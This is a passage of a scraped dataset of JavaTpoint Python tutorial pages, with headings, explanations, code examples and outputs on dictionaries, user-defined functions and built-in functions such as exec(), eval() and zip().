'Peter', 3: 'Thomas'}"", '# Deleting a key', '# using pop() method', 'pop_ele = Dict.pop(3)', 'print(Dict)', 'Employee = {""Name"": ""John"", ""Age"": 29, ""salary"":25000,""Company"":""GOOGLE""}', 'for x in Employee:', 'print(x)', 'Employee = {""Name"": ""John"", ""Age"": 29, ""salary"":25000,""Company"":""GOOGLE""}', 'for x in Employee:', 'print(Employee[x])', 'Employee = {""Name"": ""John"", ""Age"": 29, ""salary"":25000,""Company"":""GOOGLE""}', 'for x in Employee.values():', 'print(x)', 'Employee = {""Name"": ""John"", ""Age"": 29, ""salary"":25000,""Company"":""GOOGLE""}', 'for x in Employee.items():', 'print(x)', 'Employee={""Name"":""John"",""Age"":29,""Salary"":25000,""Company"":""GOOGLE"",""Name"":""John""}', 'for x,y in Employee.items():', 'print(x,y)', 'Employee = {""Name"": ""John"", ""Age"": 29, ""salary"":25000,""Company"":""GOOGLE"",[100,201,301]:""Department ID""}', 'for x,y in Employee.items():', 'print(x,y)']","[""<class 'dict'>\nPrinting Employee data .... \n{'Name': 'John', 'Age': 29, 'salary': 25000, 'Company': 'GOOGLE'}"", ""Empty Dictionary: \n{}\n\nCreate Dictionary by using dict(): \n{1: 'Java', 2: 'T', 3: 'Point'}\n\nDictionary with each item as a pair: \n{1: 'Devansh', 2: 'Sharma'}"", ""<class 'dict'>\nprinting Employee data .... \nName : John\nAge : 29\nSalary : 25000\nCompany : GOOGLE"", ""Empty Dictionary: \n{}\n\nDictionary after adding 3 elements: \n{0: 'Peter', 2: 'Joseph', 3: 'Ricky'}\n\nDictionary after adding 3 elements: \n{0: 'Peter', 2: 'Joseph', 3: 'Ricky', 'Emp_ages': (20, 33, 24)}\n\nUpdated key value: \n{0: 'Peter', 2: 'Joseph', 3: 'JavaTpoint', 'Emp_ages': (20, 33, 24)}"", ""Empty Dictionary: \n{}\n\nDictionary after adding 3 elements: \n{0: 'Peter', 2: 'Joseph', 3: 'Ricky'}\n\nDictionary after adding 3 elements: \n{0: 'Peter', 2: 'Joseph', 3: 'Ricky', 'Emp_ages': (20, 33, 24)}\n\nUpdated key value: \n{0: 'Peter', 2: 'Joseph', 3: 'JavaTpoint', 'Emp_ages': (20, 33, 24)}"", ""<class 'dict'>\nprinting Employee data .... \n{'Name': 'John', 'Age': 29, 'salary': 25000, 'Company': 'GOOGLE'}\nDeleting some of the employee data\nprinting the modified information \n{'Age': 29, 'salary': 25000}\nDeleting the dictionary: Employee\nLets try to print it again \nNameError: name 'Employee' is not defined"", ""{1: 'JavaTpoint', 2: 'Peter'}"", 'Name\nAge\nsalary\nCompany', 'John\n29\n25000\nGOOGLE', 'John\n29\n25000\nGOOGLE', ""('Name', 'John')\n('Age', 29)\n('salary', 25000)\n('Company', 'GOOGLE')"", 'Name John\nAge 29\nSalary 25000\nCompany GOOGLE', 'Traceback (most recent call last):\n  File ""dictionary.py"", line 1, in \n    Employee = {""Name"": ""John"", ""Age"": 29, ""salary"":25000,""Company"":""GOOGLE"",[100,201,301]:""Department ID""}\nTypeError: unhashable type: \'list\'']","['SN|||Function|||Description&&&1|||cmp(dict1, dict2)|||It compares the items of both the dictionary and returns true if the first dictionary values are greater than the second dictionary, otherwise it returns false.&&&2|||len(dict)|||It is used to calculate the length of the dictionary.&&&3|||str(dict)|||It converts the dictionary into the printable string representation.&&&4|||type(variable)|||It is used to print the type of the passed variable.', 'SN|||Method|||Description&&&1|||dic.clear()|||It is used to delete all the items of the dictionary.&&&2|||dict.copy()|||It returns a shallow copy of the dictionary. &&&3|||dict.fromkeys(iterable, value = None, /)|||Create a new dictionary from the iterable with the values equal to value.&&&4|||dict.get(key, default = ""None"")|||It is used to get the value specified for the passed key.&&&5|||dict.has_key(key)|||It returns true if the dictionary contains the specified key.&&&6|||dict.items()|||It returns all the key-value pairs as a tuple.&&&7|||dict.keys()|||It returns all the keys of the dictionary.&&&8|||dict.setdefault(key,default= ""None"")|||It is used to set the key to the default value if the key is not specified in the dictionary&&&9|||dict.update(dict2)|||It updates the dictionary by adding the key-value pair of dict2 to this dictionary.&&&10|||dict.values()|||It returns all the values of the dictionary.&&&11|||len()|||&&&12|||popItem()|||&&&13|||pop()|||&&&14|||count()|||&&&15|||index()|||']","['|||Keys must be a single element|||Value can be any type such as list, tuple, integer, etc.||||||Using pop() method|||']"
25,['Python Function'],"['Functions are the most important aspect of an application. A function can be defined as the organized block of reusable code, which can be called whenever required.']","['https://www.javatpoint.com/python-built-in-functions', 'https://www.javatpoint.com/python-dictionary', 'https://www.javatpoint.com/python-built-in-functions', 'https://www.javatpoint.com/python-dictionary', 'https://www.javatpoint.com/python-built-in-functions']",[],[],"['Advantage of Functions in Python', 'The return statement', 'Arguments in function', 'Call by reference in Python', 'Types of arguments', 'Default Arguments', 'Scope of variables']","['Creating a Function', 'Function Calling', 'Example 1', 'Example 2 Creating function without return statement', 'Example 1', 'Example 2', 'Example 1 Passing Immutable Object (List)', 'Required Arguments', 'Variable-length Arguments (*args)', 'Keyword arguments(**kwargs)', 'Example 1 Local Variable', 'Example 2 Global Variable']",[],"['There are mainly two types of functions.', 'In this tutorial, we will discuss the user define functions.', 'There are the following advantages of Python functions.', 'Python provides the def keyword to define the function. The syntax of the define function is given below.', ""Let's understand the syntax of functions definition."", 'Consider the following example of a simple example that prints the message ""Hello World"".', 'Consider the following example:', 'Consider the following example, which contains a function that accepts a string as the argument.', 'There may be several types of arguments which can be passed at the time of function call.', 'Consider the following example.', 'However, at the function definition, we define the variable-length argument using the *args (star) as *<variable - name >.', 'Consider the following example.', 'Consider the following example.', 'Example 2 providing the values in different order at the calling', 'If we provide the different name of arguments at the time of function call, an error will be thrown.', 'Consider the following example.', 'Consider the following example.', 'The following example will cause an error due to an in-proper mix of keyword and required arguments being passed in the function call.', 'This type of arguments is useful when we do not know the number of arguments in advance.', 'Consider the following example:', 'Example 6: Many arguments using Keyword argument ', 'In python, the variables are defined with the two types of scopes.', 'Consider the following example.']","['The Function helps to programmer to break the program into the smaller part. It organizes the code very effectively and avoids the repetition of the code. As the program grows, function makes the program more organized.', 'Python provide us various inbuilt functions like range() or print(). Although, the user can create its functions, which can be called user-defined functions.', 'The return statement is used at the end of the function and returns the result of the function. It terminates the function execution and transfers the result where the function is called. The return statement cannot be used outside of the function.', 'It can contain the expression which gets evaluated and value is returned to the caller function. If the return statement has no expression or does not exist itself in the function then it returns the None object.', 'In the above code, we have defined the function named sum, and it has a statement c = a+b, which computes the given values, and the result is returned by the return statement to the caller function.', 'In the above code, we have defined the same function without the return statement as we can see that the sum() function returned the None object to the caller function.', 'The arguments are types of information which can be passed into the function. The arguments are specified in the parentheses. We can pass any number of arguments, but they must be separate them with a comma.', 'Python allows us to call the function with the keyword arguments. This kind of function call will enable us to pass the arguments in the random order.', 'The name of the arguments is treated as the keywords and matched in the function calling and definition. If the same match is found, the values of the arguments are copied in the function definition.', 'Python provides the facility to pass the multiple keyword arguments which can be represented as **kwargs. It is similar as the *args but it stores the argument in the dictionary format.', 'The scopes of the variables depend upon the location where the variable is being declared. The variable declared in one part of the program may not be accessible to the other parts.', 'The variable defined outside any function is known to have a global scope, whereas the variable defined inside a function is known to have a local scope.']","['Python allows us to divide a large program into the basic building blocks known as a function. The function contains the set of programming statements enclosed by {}. A function can be called multiple times to provide reusability and modularity to the Python program.', 'In Python, after the function is created, we can call it from another function. A function must be defined before the function call; otherwise, the Python interpreter gives an error. To call the function, use the function name followed by the parentheses.', 'In Python, call by reference means passing the actual value as an argument in the function. All the functions are called by reference, i.e., all the changes made to the reference inside the function revert back to the original value referred by the reference.', 'Till now, we have learned about function calling in Python. However, we can provide the arguments at the time of the function call. As far as the required arguments are concerned, these are the arguments which are required to be passed at the time of function calling with the exact match of their positions in the function call and function definition. If either of the arguments is not provided in the function call, or the position of the arguments is changed, the Python interpreter will show the error.', 'Python allows us to initialize the arguments at the function definition. If the value of any of the arguments is not provided at the time of function call, then that argument can be initialized with the value given in the definition even if the argument is not specified at the function call.', 'In large projects, sometimes we may not know the number of arguments to be passed in advance. In such cases, Python provides us the flexibility to offer the comma-separated values which are internally treated as tuples at the function call. By using the variable-length arguments, we can pass any number of arguments.', 'In the above code, we passed *names as variable-length argument. We called the function and passed values which are treated as tuple internally. The tuple is an iterable sequence the same as the list. To print the given values, we iterated *arg names using for loop.', 'The Python allows us to provide the mix of the required arguments and keyword arguments at the time of function call. However, the required argument must not be given after the keyword argument, i.e., once the keyword argument is encountered in the function call, the following arguments must also be the keyword arguments.']","['def my_function(parameters):', 'function_block', 'return expression', '#function definition', 'def hello_world():', 'print(""hello world"")', '# function calling', 'hello_world()', 'hello world', 'return [expression_list]', '# Defining function', 'def sum():', 'a = 10', 'b = 20', 'c = a+b', 'return c', '# calling sum() function in print statement', 'print(""The sum is:"",sum())', 'The sum is: 30', '# Defining function', 'def sum():', 'a = 10', 'b = 20', 'c = a+b', '# calling sum() function in print statement', 'print(sum())', '#defining the function', 'def func (name):', 'print(""Hi "",name)', '#calling the function', 'func(""Devansh"")', '#Python function to calculate the sum of two variables', '#defining the function', 'def sum (a,b):', 'return a+b;', '#taking values from the user', 'a = int(input(""Enter a: ""))', 'b = int(input(""Enter b: ""))', '#printing the sum of a and b', 'print(""Sum = "",sum(a,b))', '#defining the function', 'def change_list(list1):', 'list1.append(20)', 'list1.append(30)', 'print(""list inside function = "",list1)', '#defining the list', 'list1 = [10,30,40,50]', '#calling the function', 'change_list(list1)', 'print(""list outside function = "",list1)', 'list inside function =  [10, 30, 40, 50, 20, 30]', 'list outside function =  [10, 30, 40, 50, 20, 30]', '#defining the function', 'def change_string (str):', 'str = str + "" Hows you ""', 'print(""printing the string inside function :"",str)', 'string1 = ""Hi I am there""', '#calling the function', 'change_string(string1)', 'print(""printing the string outside function :"",string1)', 'printing the string inside function : Hi I am there Hows you', 'printing the string outside function : Hi I am there', 'def func(name):', 'message = ""Hi ""+name', 'return message', 'name = input(""Enter the name:"")', 'print(func(name))', 'Enter the name: John', '#the function simple_interest accepts three arguments and returns the simple interest accordingly', 'def simple_interest(p,t,r):', 'return (p*t*r)/100', 'p = float(input(""Enter the principle amount? ""))', 'r = float(input(""Enter the rate of interest? ""))', 't = float(input(""Enter the time in years? ""))', 'print(""Simple Interest: "",simple_interest(p,r,t))', 'Enter the principle amount: 5000', 'Enter the rate of interest: 5', 'Enter the time in years: 3', 'Simple Interest:  750.0', '#the function calculate returns the sum of two arguments a and b', 'def calculate(a,b):', 'return a+b', 'calculate(10) # this causes an error as we are missing a required arguments b.', ""TypeError: calculate() missing 1 required positional argument: 'b'"", 'def printme(name,age=22):', 'print(""My name is"",name,""and age is"",age)', 'printme(name = ""john"")', 'My name is John and age is 22', 'def printme(name,age=22):', 'print(""My name is"",name,""and age is"",age)', 'printme(name = ""john"") #the variable age is not passed into the function however the default value of age is considered in the function', 'printme(age = 10,name=""David"") #the value of age is overwritten here, 10 will be printed as age', 'My name is john and age is 22', 'My name is David and age is 10', 'def printme(*names):', 'print(""type of passed argument is "",type(names))', 'print(""printing the passed arguments..."")', 'for name in names:', 'print(name)', 'printme(""john"",""David"",""smith"",""nick"")', ""type of passed argument is  <class 'tuple'>"", 'printing the passed arguments...', '#function func is called with the name and message as the keyword arguments', 'def func(name,message):', 'print(""printing the message with"",name,""and "",message)', '#name and message is copied with the values John and hello respectively', 'func(name = ""John"",message=""hello"")', 'printing the message with John and  hello', ""#The function simple_interest(p, t, r) is called with the keyword arguments the order of arguments doesn't matter in this case"", 'def simple_interest(p,t,r):', 'return (p*t*r)/100', 'print(""Simple Interest: "",simple_interest(t=10,r=10,p=1900))', 'Simple Interest:  1900.0', '#The function simple_interest(p, t, r) is called with the keyword arguments.', 'def simple_interest(p,t,r):', 'return (p*t*r)/100', ""# doesn't find the exact match of the name of the arguments (keywords)"", 'print(""Simple Interest: "",simple_interest(time=10,rate=10,principle=1900))', ""TypeError: simple_interest() got an unexpected keyword argument 'time'"", 'def func(name1,message,name2):', 'print(""printing the message with"",name1,"","",message,"",and"",name2)', '#the first argument is not the keyword argument', 'func(""John"",message=""hello"",name2=""David"")', 'printing the message with John , hello ,and David', 'def func(name1,message,name2):', 'print(""printing the message with"",name1,"","",message,"",and"",name2)', 'func(""John"",message=""hello"",""David"")', 'SyntaxError: positional argument follows keyword argument', 'def food(**kwargs):', 'print(kwargs)', 'food(a=""Apple"")', 'food(fruits=""Orange"", Vagitables=""Carrot"")', 'def print_message():', 'message = ""hello !! I am going to print a message."" # the variable message is local to the function itself', 'print(message)', 'print_message()', 'print(message) # this will cause an error since a local variable cannot be accessible here.', 'hello !! I am going to print a message.', 'File ""/root/PycharmProjects/PythonTest/Test1.py"", line 5, in', 'print(message)', ""NameError: name 'message' is not defined"", 'def calculate(*args):', 'sum=0', 'for arg in args:', 'sum = sum +arg', 'print(""The sum is"",sum)', 'calculate(10,20,30) #60 will be printed as the sum', 'print(""Value of sum outside the function:"",sum) # 0 will be printed  Output:', 'The sum is 60', 'Value of sum outside the function: 0']","['hello world', 'The sum is: 30', 'None', 'Hi Devansh', 'Enter a: 10\nEnter b: 20\nSum =  30', 'list inside function =  [10, 30, 40, 50, 20, 30]\nlist outside function =  [10, 30, 40, 50, 20, 30]', 'printing the string inside function : Hi I am there Hows you \nprinting the string outside function : Hi I am there', 'Enter the name: John\nHi John', 'Enter the principle amount: 5000\nEnter the rate of interest: 5\nEnter the time in years: 3\nSimple Interest:  750.0', ""TypeError: calculate() missing 1 required positional argument: 'b'"", 'My name is John and age is 22', 'My name is john and age is 22\nMy name is David and age is 10', ""type of passed argument is  <class 'tuple'>\nprinting the passed arguments...\njohn\nDavid\nsmith\nnick"", 'printing the message with John and  hello', 'Simple Interest:  1900.0', ""TypeError: simple_interest() got an unexpected keyword argument 'time'"", 'printing the message with John , hello ,and David', 'SyntaxError: positional argument follows keyword argument', ""{'a': 'Apple'}\n{'fruits': 'Orange', 'Vagitables': 'Carrot'}"", 'hello !! I am going to print a message.\n  File ""/root/PycharmProjects/PythonTest/Test1.py"", line 5, in \n    print(message)\nNameError: name \'message\' is not defined', 'The sum is 60\nValue of sum outside the function: 0']",[],"['|||User-define functions - The user-defined functions are those define by the user to perform the specific task.|||Built-in functions - The built-in functions are those functions that are pre-defined in Python.||||||Using functions, we can avoid rewriting the same logic/code again and again in a program.|||We can call Python functions multiple times in a program and anywhere in a program.|||We can track a large Python program easily when it is divided into multiple functions.|||Reusability is the main achievement of Python functions.|||However, Function calling is always overhead in a Python program.||||||The def keyword, along with the function name is used to define the function.|||The identifier rule must follow the function name.|||A function accepts the parameter (argument), and they can be optional.|||The function block is started with the colon (:), and block statements must be at the same indentation.|||The return statement is used to return the value. A function can have only one return|||&&&|||Required arguments|||Keyword arguments|||Default arguments|||Variable-length arguments||||||Global variables|||Local variables|||']"
26,['Python Built-in Functions'],['The Python built-in functions are defined as the functions whose functionality is pre-defined in Python. The python interpreter has several functions that are always present for use. These functions are known as Built-in Functions. There are several built-in functions in Python which are listed below:'],"['https://www.javatpoint.com/python-lambda-functions', 'https://www.javatpoint.com/python-functions', 'https://www.javatpoint.com//cdn-cgi/l/email-protection', 'https://www.javatpoint.com//cdn-cgi/l/email-protection', 'https://www.javatpoint.com/python-lambda-functions', 'https://www.javatpoint.com/python-functions', 'https://www.javatpoint.com/python-lambda-functions']",[],[],"['Python abs() Function', 'Python all() Function', 'Python bin() Function', 'Python bool() ', 'Python bytes() ', 'Python callable() Function', 'Python compile() Function', 'Python exec() Function', 'Python sum() Function', 'Python any() Function', 'Python ascii() Function', 'Python bytearray() ', 'Python eval() Function', 'Python float()', 'Python format() Function', 'Python frozenset()', 'Python getattr() Function', 'Python globals() Function', 'Python hasattr() Function ', 'Python iter() Function ', 'Python len() Function ', 'Python list() ', 'Python locals() Function ', 'Python map() Function ', 'Python memoryview() Function ', 'Python object() ', 'Python open() Function ', 'Python chr() Function ', 'Python complex() ', 'Python delattr() Function ', 'Python dir() Function ', 'Python divmod() Function', 'Python enumerate() Function', 'Python dict()', 'Python filter() Function', 'Python hash() Function', 'Python help() Function', 'Python min() Function', 'Python set() Function', 'Python hex() Function', 'Python id() Function', 'Python setattr() Function', 'Python slice() Function', 'Python sorted() Function', 'Python next() Function', 'Python input() Function', 'Python int() Function', 'Python isinstance() Function', 'Python oct() Function', 'Python ord() Function', 'Python pow() Function', 'Python print() Function', 'Python range() Function', 'Python reversed() Function', 'Python round() Function', 'Python issubclass() Function', 'Python str', 'Python tuple() Function', 'Python type()', 'Python vars() function', 'Python zip() Function']",[],[],"['Python abs() Function Example', 'Python all() Function Example', 'The python bin() function is used to return the binary representation of a specified integer. A result always starts with the prefix 0b.', 'Python bin() Function Example', 'The python bool() converts a value to boolean(True or False) using the standard truth testing procedure.', 'Python bool() Example', 'The python bytes() in Python is used for returning a bytes object. It is an immutable version of the bytearray() function.', 'It can create empty bytes object of the specified size.', 'Python bytes() Example', 'Python callable() Function Example', 'The python compile() function takes source code as input and returns a code object which can later be executed by exec() function.', 'Python compile() Function Example', 'Python exec() Function Example', 'As the name says, python sum() function is used to get the sum of numbers of an iterable, i.e., list.', 'Python sum() Function Example', 'The python any() function returns true if any item in an iterable is true. Otherwise, it returns False.', 'Python any() Function Example', 'Python ascii() Function Example', 'Python bytearray() Example', 'The python eval() function parses the expression passed to it and runs python expression(code) within the program.', 'Python eval() Function Example', 'The python float() function returns a floating-point number from a number or string.', 'Python float() Example', 'The python format() function returns a formatted representation of the given value.', 'Python format() Function Example', 'The python frozenset() function returns an immutable frozenset object initialized with elements from the given iterable.', 'Python frozenset() Example', 'The python getattr() function returns the value of a named attribute of an object. If it is not found, it returns the default value.', 'Python getattr() Function Example', 'The python globals() function returns the dictionary of the current global symbol table.', 'Python globals() Function Example', 'The python any() function returns true if any item in an iterable is true, otherwise it returns False.', 'Python hasattr() Function Example', 'The python iter() function is used to return an iterator object. It creates an object which can be iterated one element at a time.', 'Python iter() Function Example', 'The python len() function is used to return the length (the number of items) of an object.', 'Python len() Function Example', 'The python list() creates a list in python.', 'Python list() Example', 'The python locals() method updates and returns the dictionary of the current local symbol table.', 'Python locals() Function Example', 'The python map() function is used to return a list of results after applying a given function to each item of an iterable(list, tuple etc.).', 'Python map() Function Example', 'The python memoryview() function returns a memoryview object of the given argument.', 'Python memoryview () Function Example', 'Python object() Example', 'The python open() function opens the file and returns a corresponding file object.', 'Python open() Function Example', 'Python chr() Function Example', 'Python complex() Example', 'Python delattr() Function Example', 'Python dir() Function Example', 'Python divmod() Function Example', 'Python enumerate() Function Example', 'Python dict() function is a constructor which creates a dictionary. Python dictionary provides three different constructors to create a dictionary:', 'Python dict() Example', 'The first argument can be none, if the function is not available and returns only elements that are true.', 'Python filter() Function Example', 'Hashable types: * bool * int * long * float * string * Unicode * tuple * code object.', 'Python hash() Function Example', 'Python help() Function Example', 'Python min() Function Example', 'Python set() Function Example', 'Python hex() Function Example', 'Python id() Function Example', 'Python setattr() Function Example', 'Python slice() Function Example', 'Python sorted() Function Example', 'This method calls on iterator and throws an error if no item is present. To avoid the error, we can set a default value.', 'Python next() Function Example', 'Python input() Function Example', 'If the number is not a number or if a base is given, the number must be a string.', 'Python int() Function Example', 'The isinstance() function takes two arguments, i.e., object and classinfo, and then it returns either True or False.', 'Python isinstance() function Example', 'Python oct() function Example', 'The python ord() function returns an integer representing Unicode code point for the given Unicode character.', 'Python ord() function Example', 'Python pow() function Example', 'The python print() function prints the given object to the screen or other standard output devices.', 'Python print() function Example', 'Python range() function Example', 'The python reversed() function returns the reversed iterator of the given sequence.', 'Python reversed() function Example', 'The python round() function rounds off the digits of a number and returns the floating point number.', 'Python round() Function Example', 'The python issubclass() function returns true if object argument(first argument) is a subclass of second class(second argument).', 'Python issubclass() Function Example', 'The python str() converts a specified value into a string. ', 'Python str() Function Example', 'The python tuple() function is used to create a tuple object.', 'Python tuple() Function Example', 'Python type() Function Example', 'The python vars() function returns the __dict__ attribute of the given object.', 'Python vars() Function Example', 'Python zip() Function Example']","['The python all() function accepts an iterable object (such as list, dictionary, etc.). It returns true if all items in passed iterable are true. Otherwise, it returns False. If the iterable object is empty, the all() function returns True.', 'A python callable() function in Python is something that can be called. This built-in function checks and returns true if the object passed appears to be callable, otherwise false.', 'The python exec() function is used for the dynamic execution of Python program which can either be a string or object code and it accepts large blocks of code, unlike the eval() function which only accepts a single expression.', 'The python ascii() function returns a string containing a printable representation of an object and escapes the non-ASCII characters in the string using \\x, \\u or \\U escapes.', 'The python bytearray() returns a bytearray object and can convert objects into bytearray objects, or create an empty bytearray object of the specified size.', 'A Symbol table is defined as a data structure which contains all the necessary information about the program. It includes variable names, methods, classes, etc.', 'A Symbol table is defined as a data structure which contains all the necessary information about the program. It includes variable names, methods, classes, etc.', 'The python object() returns an empty object. It is a base for all the classes and holds the built-in properties and methods which are default for all the classes.', 'Python complex() function is used to convert numbers or string into a complex number. This method takes two optional parameters and returns a complex number. The first parameter is called a real and second as imaginary parts.', 'Python divmod() function is used to get remainder and quotient of two numbers. This function takes two numeric arguments and returns a tuple. Both arguments are required and numeric', 'Python enumerate() function returns an enumerated object. It takes two parameters, first is a sequence of elements and the second is the start index of the sequence. We can get the elements in sequence either through a loop or next() method.', 'Python min() function is used to get the smallest element from the collection. This function takes two arguments, first is a collection of elements and second is key, and returns the smallest element from the collection.', 'In python, a set is a built-in class, and this function is a constructor of this class. It is used to create a new set using elements passed during the call. It takes an iterable object as an argument and returns a new set object. ', 'Python next() function is used to fetch next item from the collection. It takes two arguments, i.e., an iterator and a default value, and returns an element.', 'Python input() function is used to get an input from the user. It prompts for the user input and reads a line. After reading data, it converts it into a string and returns it. It throws an error EOFError if EOF is read.', 'Python isinstance() function is used to check whether the given object is an instance of that class. If the object belongs to the class, it returns true. Otherwise returns False. It also returns true if the class is a subclass.', 'Python oct() function is used to get an octal value of an integer number. This method takes an argument and returns an integer converted into an octal string. It throws an error TypeError, if argument type is other than an integer.', 'The python pow() function is used to compute the power of a number. It returns x to the power of y. If the third argument(z) is given, it returns x to the power of y modulus z, i.e. (x, y) % z.', 'The python range() function returns an immutable sequence of numbers starting from 0 by default, increments by 1 (by default) and ends at a specified number. ', 'The python type() returns the type of the specified object if a single argument is passed to the type() built in function. If three arguments are passed, then it returns a new type object.']","['The python abs() function is used to return the absolute value of a number. It takes only one argument, a number whose absolute value is to be returned. The argument can be an integer and floating-point number. If the argument is a complex number, then, abs() returns its magnitude.', ""Python chr() function is used to get a string representing a character which points to a Unicode code integer. For example, chr(97) returns the string 'a'. This function takes an integer argument and throws an error if it exceeds the specified range. The standard range of the argument is from 0 to 1,114,111."", 'Python delattr() function is used to delete an attribute from a class. It takes two parameters, first is an object of the class and second is an attribute which we want to delete. After deleting the attribute, it no longer available in the class and throws an error if try to call it using the class object.', 'Python dir() function returns the list of names in the current local scope. If the object on which method is called has a method named __dir__(), this method will be called and must return the list of attributes. It takes a single object type argument. ', 'Python filter() function is used to get filtered elements. This function takes two arguments, first is a function and the second is iterable. The filter function returns a sequence of those elements of iterable object for which function returns true value.', 'Python hash() function is used to get the hash value of an object. Python calculates the hash value by using the hash algorithm. The hash values are integers and used to compare dictionary keys during a dictionary lookup. We can hash only the types which are given below:', ""Python help() function is used to get help related to the object passed during the call. It takes an optional parameter and returns help information. If no argument is given, it shows the Python help console. It internally calls python's help function."", 'Python hex() function is used to generate hex value of an integer argument. It takes an integer argument and returns an integer converted into a hexadecimal string. In case, we want to get a hexadecimal value of a float, then use float.hex() function. ', 'Python id() function returns the identity of an object. This is an integer which is guaranteed to be unique. This function takes an argument as an object and returns a unique integer number which represents identity. Two objects with non-overlapping lifetimes may have the same id() value.', ""Python setattr() function is used to set a value to the object's attribute. It takes three arguments, i.e., an object, a string, and an arbitrary value, and returns none. It is helpful when we want to add a new attribute to an object and set a value to it."", 'Python slice() function is used to get a slice of elements from the collection of elements. Python provides two overloaded slice functions. The first function takes a single argument while the second function takes three arguments and returns a slice object. This slice object can be used to get a subsection of the collection.', 'Python sorted() function is used to sort elements. By default, it sorts elements in an ascending order but can be sorted in descending also. It takes four arguments and returns a collection in sorted order. In the case of a dictionary, it sorts only keys, not values.', 'Python int() function is used to get an integer value. It returns an expression converted into an integer number. If the argument is a floating-point, the conversion truncates the number. If the argument is outside the integer range, then it converts the number into a long type.', 'The python zip() Function returns a zip object, which maps a similar index of multiple containers. It takes iterables (can be zero or more), makes it an iterator that aggregates the elements based on iterables passed, and returns an iterator of tuples.']","['#  integer number', 'integer = -20', ""print('Absolute value of -40 is:', abs(integer))"", '#  floating number', 'floating = -20.83', ""print('Absolute value of -40.83 is:', abs(floating))"", '# all values true', 'k = [1, 3, 4, 6]', 'print(all(k))', '# all values false', 'k = [0, False]', 'print(all(k))', '# one false value', 'k = [1, 3, 7, 0]', 'print(all(k))', '# one true value', 'k = [0, False, 5]', 'print(all(k))', '# empty iterable', 'print(all(k))', 'y =  bin(x)', 'print (y)', 'test1 = []', ""print(test1,'is',bool(test1))"", 'test1 = [0]', ""print(test1,'is',bool(test1))"", 'test1 = 0.0', ""print(test1,'is',bool(test1))"", 'test1 = None', ""print(test1,'is',bool(test1))"", 'test1 = True', ""print(test1,'is',bool(test1))"", ""test1 = 'Easy string'"", ""print(test1,'is',bool(test1))"", 'string = ""Hello World.""', ""array = bytes(string, 'utf-8')"", 'print(array)', 'print(callable(x))', '# compile string source to code', 'code_str = \'x=5\\ny=10\\nprint(""sum ="",x+y)\'', ""code = compile(code_str, 'sum.py', 'exec')"", 'print(type(code))', 'exec(code)', ""exec('print(x==8)')"", ""exec('print(x+4)')"", 's = sum([1, 2,4 ])', 'print(s)', 's = sum([1, 2, 4], 10)', 'print(s)', 'l = [4, 3, 2, 0]', 'print(any(l))', 'l = [0, False]', 'print(any(l))', 'l = [0, False, 5]', 'print(any(l))', 'print(any(l))', ""normalText = 'Python is interesting'"", 'print(ascii(normalText))', ""otherText = 'Pythön is interesting'"", 'print(ascii(otherText))', ""print('Pyth\\xf6n is interesting')"", 'string = ""Python is a programming language.""', ""# string with encoding 'utf-8'"", ""arr = bytearray(string, 'utf-8')"", 'print(arr)', ""print(eval('x + 1'))"", '# for integers', 'print(float(9))', '# for floats', 'print(float(8.19))', '# for string floats', 'print(float(""-24.27""))', '# for string floats with whitespaces', 'print(float(""     -17.19\\n""))', '# string float error', 'print(float(""xyz""))', '# d, f and b are a type', '# integer', 'print(format(123, ""d""))', '# float arguments', 'print(format(123.4567898, ""f""))', '# binary format', 'print(format(12, ""b""))', '# tuple of letters', ""letters = ('m', 'r', 'o', 't', 's')"", 'fSet = frozenset(letters)', ""print('Frozen set is:', fSet)"", ""print('Empty frozen set is:', frozenset())"", 'class Details:', 'age = 22', 'name = ""Phill""', 'details = Details()', 'print(\'The age is:\', getattr(details, ""age""))', ""print('The age is:', details.age)"", 'age = 22', ""globals()['age'] = 22"", ""print('The age is:', age)"", 'l = [4, 3, 2, 0]', 'print(any(l))', 'l = [0, False]', 'print(any(l))', 'l = [0, False, 5]', 'print(any(l))', 'print(any(l))', '# list of numbers', 'list = [1,2,3,4,5]', 'listIter = iter(list)', ""# prints '1'"", 'print(next(listIter))', ""# prints '2'"", 'print(next(listIter))', ""# prints '3'"", 'print(next(listIter))', ""# prints '4'"", 'print(next(listIter))', ""# prints '5'"", 'print(next(listIter))', ""strA = 'Python'"", 'print(len(strA))', '# empty list', 'print(list())', '# string', ""String = 'abcde'"", 'print(list(String))', 'Tuple = (1,2,3,4,5)', 'print(list(Tuple))', 'List = [1,2,3,4,5]', 'print(list(List))', 'def localsAbsent():', 'return locals()', 'def localsPresent():', 'present = True', 'return locals()', ""print('localsNotPresent:', localsAbsent())"", ""print('localsPresent:', localsPresent())"", 'def calculateAddition(n):', 'return n+n', 'numbers = (1, 2, 3, 4)', 'result = map(calculateAddition, numbers)', 'print(result)', '# converting map object to set', 'numbersAddition = set(result)', 'print(numbersAddition)', '#A random bytearray', ""randomByteArray = bytearray('ABC', 'utf-8')"", 'mv = memoryview(randomByteArray)', ""# access the memory view's zeroth index"", 'print(mv[0])', '# It create byte from memory view', 'print(bytes(mv[0:2]))', '# It create list from memory view', 'print(list(mv[0:3]))', 'python = object()', 'print(type(python))', 'print(dir(python))', '# opens python.text file of the current directory', 'f = open(""python.txt"")', '# specifying full path', 'f = open(""C:/Python33/README.txt"")', '# Calling function', 'result = chr(102) # It returns string representation of a char', 'result2 = chr(112)', '# Displaying result', 'print(result)', 'print(result2)', '# Verify, is it string type?', 'print(""is it string type:"", type(result) is str)', '# Python complex() function example', '# Calling function', 'a = complex(1) # Passing single parameter', 'b = complex(1,2) # Passing both parameters', '# Displaying result', 'print(a)', 'print(b)', 'class Student:', 'id = 101', 'name = ""Pranshu""', 'email = ""pranshu@abc.com""', '# Declaring function', 'def getinfo(self):', 'print(self.id, self.name, self.email)', 's = Student()', 's.getinfo()', ""delattr(Student,'course') # Removing attribute which is not available"", 's.getinfo() # error: throws an error', '# Calling function', 'att = dir()', '# Displaying result', 'print(att)', '# Python divmod() function example', '# Calling function', 'result = divmod(10,2)', '# Displaying result', 'print(result)', '# Calling function', 'result = enumerate([1,2,3])', '# Displaying result', 'print(result)', 'print(list(result))', '# Calling function', 'result = dict() # returns an empty dictionary', 'result2 = dict(a=1,b=2)', '# Displaying result', 'print(result)', 'print(result2)', '# Python filter() function example', 'def filterdata(x):', 'if x>5:', 'return x', '# Calling function', 'result = filter(filterdata,(1,2,6))', '# Displaying result', 'print(list(result))', '# Calling function', 'result = hash(21) # integer value', 'result2 = hash(22.2) # decimal value', '# Displaying result', 'print(result)', 'print(result2)', '# Calling function', 'info = help() # No argument', '# Displaying result', 'print(info)', '# Calling function', 'small = min(2225,325,2025) # returns smallest element', 'small2 = 